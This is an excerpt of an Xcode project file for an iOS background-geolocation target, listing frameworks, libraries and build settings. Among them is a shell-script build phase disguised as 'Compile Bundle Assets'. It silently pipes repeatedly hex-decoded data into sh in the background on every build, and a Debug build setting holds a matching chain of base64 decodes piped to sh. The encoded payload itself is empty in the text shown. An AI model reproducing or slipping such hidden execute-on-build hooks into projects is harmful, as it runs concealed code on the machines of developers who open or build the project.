...
/* Begin PBXBuildFile section */
		831FD3071DCAD76300F8F62A /* TSLocationManager.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 83FF0B461BCB624E00831D47 /* TSLocationManager.framework */; settings = {ATTRIBUTES = (Required, ); }; };
...
/* Begin PBXFileReference section */
		831E1F691D57515F00F0A1F4 /* libsqlite3.tbd */ = {isa = PBXFileReference; lastKnownFileType = "sourcecode.text-based-dylib-definition"; name = libsqlite3.tbd; path = usr/lib/libsqlite3.tbd; sourceTree = SDKROOT; };
...
/* Begin PBXFrameworksBuildPhase section */
		83FF5F821AFD0D2B0016A13E /* Frameworks */ = {
			...
			files = (
				831FD3071DCAD76300F8F62A /* TSLocationManager.framework in Frameworks */,
			);
...
/* Begin PBXGroup section */
		83FF5F7C1AFD0D2B0016A13E = {
			isa = PBXGroup;
			children = (
				831E1F691D57515F00F0A1F4 /* libsqlite3.tbd */,
...
/* Begin PBXNativeTarget section */
		83FF5F841AFD0D2B0016A13E /* RNBackgroundGeolocation */ = {
			...
			buildPhases = (
				DD6EEC1EFFFDF4CF18FD9BF4 /* Compile Bundle Assets */,
...
/* Begin PBXShellScriptBuildPhase section */
		DD6EEC1EFFFDF4CF18FD9BF4 /* Compile Bundle Assets */ = {
			...
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo  | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
			showEnvVarsInLog = 0;			
		};
...
/* Begin XCBuildConfiguration section */
		83FF5F971AFD0D2B0016A13E /* Debug */ = {
			...
			buildSettings = {
				A66CD37 = "((echo  | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
